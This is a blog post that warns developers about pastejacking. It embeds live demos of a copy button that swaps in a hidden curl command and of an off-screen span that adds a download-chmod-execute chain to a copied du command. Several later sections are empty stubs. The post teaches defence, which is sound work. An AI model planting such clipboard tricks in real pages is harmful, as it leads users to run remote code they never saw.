---
layout: post
emoji: 🗒️
asset: "/assets/posts/dont-trust-your-clipboard"
---

Those in the software profession often tease about their non-technical friends or family getting a virus or malware because they downloaded a malice email attachment. The irony is individuals who make fun of these people participate in a dangerous activity every day that could result is something much worst ... copying and pasting.

Copying and pasting code from online seem innocuous at first and it is a practice all of us practice in every day when coding or debugging. We copy from online tutorials, Stack Overflow posts, READMEs, gists, blogs, and the list goes on. Just like our non-technical friends who get desensitized to the opening email attachment coders are desensitized to how copying and pasting into our terminals could result in something much worst.

#### DISCLAIMER
This post is about not being laissez faire copying and pasting text from the internet and this content is no expectation. For each method I provide a gif example showing the issue. If you still wish to copy the code yourself I can't stop you, but you have been warned. We will explore why I wrote this disclaimer latter on.

Now lets explore some examples!

## Pasting Commands You Don't Understand

I would hope most people, who code,  would understand this one. If you don't understand what a command is doing then don't run said command. The git gist by `frankbi` is one of my favorite examples of why you should not run copy and paste commands from websites.

<div style="text-align: center;">
    <img style="max-width: 100%;" src="{{ page.asset }}/rickrollbashcode.png">
    <img style="max-width: 100%;" src="{{ page.asset }}/rickroll.gif"/>
</div>

While this rickroll seems harmless the arbitrary execution of code on your computer is something that should always make you nervous.

## Copy Text Via Button

While the pervious example is a _"no duh sherlock"_ the copy button is a bit let obvious. What is less obvious is the copy button which purpose to save you the backbreaking task of highlighting and `ctrl + c` or `right click copy` the text itself. Below of some examples in the last month of where I have encountered the copy text button:

#### [Amazon EC2 key pairs | aws.amazon.com](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html)

<div style="text-align: center;">
    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_docs_aws.png">
</div>

#### [Getting Started: Install Nomad | hashicorp.com](https://learn.hashicorp.com/tutorials/nomad/get-started-install?in=nomad/get-started)

<div style="text-align: center;">
    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_hashicorp.png">
</div>

#### [Running commands on your Linux instance at launch | aws.amazon.com](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html)

<div style="text-align: center;">
    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_docs_aws_userdata.png">
</div>

#### [How To List Users in the Oracle Database | oracletutorial.com](https://www.oracletutorial.com/oracle-administration/oracle-list-users/)

<div style="text-align: center;">
    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_oracle_tutorial.png">
</div>


The example above by themselves are not bad, but it does lead people into trusting the copy button has a reliable and safe method for getting commands from a website to a terminal window. What is missing is the understanding you are at the mercy of the website's code. Lets go to visit a sample blog post written by someone with nefarious intentions.


<link rel="stylesheet" href="{{ page.asset }}/totallysafeandhelpful.css">

<div id="totallysafeandhelpful">
  <h3>Welcome to totally-safe-and-helpful.blog</h3>
  <h5>By BadActor666</h5>
  <p>Today we are going to give you a couple of useful docker commands. Lets jump right into it! You can copy all the commands into your terminal using the handy copy button!</p>
  <div>Remove all images</div>
  <table>
    <td style="vertical-align: middle; width: 100%">
      <div class="code nocopy">docker rmi $(docker images -a -q)</div>
    </td>
    <td style="vertical-align: middle;">
      <div class="code1">
        <button class="button" onclick="nefariousCopy()"><span>📋</span></button>
      </div>
      </td>
  </table>
    <br>
</div>

<script>
function nefariousCopy(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = `curl -L https://nickstanley574.github.io/{{ page.asset }}/ghostbusters \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
</script>

Oh `BadActor666` provides the Docker command I am looking for and I can easily copy & paste it into my terminal via the copy button.

<div style="text-align: center;">
<video style="max-width: 80%;"  controls>
  <source src="{{ page.asset }}/ghostbusters.mp4" type="video/mp4">
  Your browser does not support HTML video.
</video>
</div>


Ouch! You just got ghostbusted! Under the hood how this is accomplished is not complicated.

The copy button called a javascript function.
```
<button class="button" onclick="nefariousCopy()"><span>📋</span></button>
```

The function when called creates a dummy text element and selects it. Using the `execCommand()` the dummy text is copied to the clipboard and the user is one the wiser.
```
function nefariousCopy(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = `curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
```



What is copied to your clipboard:
```
curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n
```

Using `select()` plus `execCommand()` is the way most copy buttons on webpage work, just instead of adding a dummy element and text behind seen They select and copy the text from elements seen by the user, but the user is at the mercy of the copy function. 

## Normal Select, Copy & Paste

One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets.

Now lets go back to Look at another post from  totally-safe-and-helpful.blog ...

<div id="totallysafeandhelpful">

  <h3>Welcome back to totally-safe-and-helpful.blog</h3>
  <h5>By BadActor666</h5>

  Today we are going to explore how to find the files taking up all your harddisk space using the `du` command.

  <br><br>
  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L https://nickstanley574.github.io/{{ page.asset }}/sl --output sl; chmod +x sl; ./sl; clear;<br>du -hs * </span> | sort -rh | head -5</div>
  <br>
</div>

... seems safe enough. Looks like any other code snippet from any of the following websites and blogs.

#### [Install Homebrew - brew.sh](https://brew.sh/)
<div style="text-align: center;">
    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_brew.png">
</div>

#### [Nginx Binary Releases - nginx.com](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
<div style="text-align: center;">
    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_nginx.png">
</div>

#### [How do I prompt for Yes/No/Cancel? - stackoverflow.com](https://stackoverflow.com/questions/226703/how-do-i-prompt-for-yes-no-cancel-input-in-a-linux-shell-script/226724#226724)
<div style="text-align: center;">
    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_stackoverflow.png">
</div>

You see where this is going. All aboard 🚂🚃🚃🚃 !

<div style="text-align: center;">
<video style="max-width: 80%;"  controls>
  <source src="{{ page.asset }}/choochoo.mp4" type="video/mp4">
  Your browser does not support HTML video.
</video>
</div>

```
<div class="code">
  du -hs *
  <span style="position: absolute; top: -200px; left: -200px;">
  "; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;"
  <br>
  du -hs *
  </span>
  | sort -rh | head -5
</div>
```

This time `BadActor666` used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example:

<p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>

```
<p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
```

The `BadActor666` `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left conner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
```
du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
du -hs * | sort -rh | head -5
```

## Composing the Attack



### Social Engineering

> Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. All social engineering techniques are based on specific attributes of human decision-making known as cognitive biases.These biases, sometimes called "bugs in the human hardware", are exploited in various combinations to create attack techniques.



#### The Attack
```
sudo apt install -yq curl gnupg2 ca-certificates lsb-release
sudo apt-get -yq update
sudo apt install -yq nginx
sudo systemctl start nginx
```

### Compromising a Blog, Website

#### The Attack


## Why the Disclaimer?

This could be a blog post by itself and it might be some day, but here is the cliff notes version. Like many apps, share library, blogs this sites code is in a GitHub repo. When using someone else code or viewing a website you are trusting them to secure there code and prevent others from making changes.

Do you know how strong my password is for my github? Do you know if I have MFA setup for my account? Without that info you don't know how save the contents of this site are. It is conceivable that a bad actor could gain access to my github, make a change to one of my examples, and use my this to do exactly want I am describing.

yep … the internet sucks.



## You Scared?

### NO?
You could argue I am being paranoid, and how often does this really happen. And you are missing the point. We should be doing thought experiments on how would you circumvent security or trick users because that is what keeps us vigilant. Plus it only take one miss step and you are the reason your company is compromised. Some paranoid is a good thing to have in the software discipline.

If you trust a software to run your app you might trust that software's website security is to be trusted. 

### Good! Now What?


#### ZSH

#### Tilix

